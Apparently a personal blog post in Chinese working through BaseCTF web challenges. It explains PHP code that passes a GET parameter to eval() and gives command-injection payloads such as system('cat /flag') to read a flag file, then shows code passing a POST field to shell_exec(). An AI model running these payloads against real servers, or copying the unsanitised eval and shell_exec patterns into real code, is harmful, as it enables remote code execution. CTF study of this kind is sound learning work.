---
layout: post
title: basectf（web
date: 2024-10-03 23:54:35 +0800
categories: [web]
---

#### 喵喵喵´•ﻌ•`
    php也可以执行系统的命令
    eval（）

        传参利用eval()漏洞问题
        eval()能将字符串按PHP代码执行，这里是常用的的PHP注入点。

	<?php  
    highlight_file(__FILE__);  
    error_reporting(0);  
    $a = $_GET['DT'];  
    eval($a);  
    ?>

在PHP中，$_GET数组获取使用GET方式提交的表单数据  
语法： 
    变量名=$_GET["name"];     //name指表单元素name属性值
      $a = $_GET['DT'];
这行代码使用 PHP 获取名为 "DT" 的 GET 请求参数的值，并将其存储在名为 $a 的变量中。
`error_reporting(0);` 这行代码在 PHP 中会禁用所有错误报告。这意味着，即使代码中有错误，也不会显示任何错误信息。
eval() 函数允许执行任意 PHP 代码

通过查看代码,我们可以发现他**读取了GET 参数中的 DT**
函数可以执行PHP代码
我们可以利用system函数执行Shell命令，也可用使用 echo file_get_contents('/flag');
来输出flag内容
下面是system
?DT=system('cat /flag' );

这样也可以（不太清楚
?DT=system("cat /f*");
<mark>**！切记最后的分号不可省略！**</mark>
![]({{ site.baseurl }}/assets/images/屏幕截图 2024-09-07 160046.png)




#### 你听不到我的声音
     我要执行 shell 指令啦! 诶? 他的输出是什么? 为什么不给我?
     应该与shell指令有关

`<?php                                                    highlight_file(__FILE__);                              shell_exec($_POST['cmd']);`
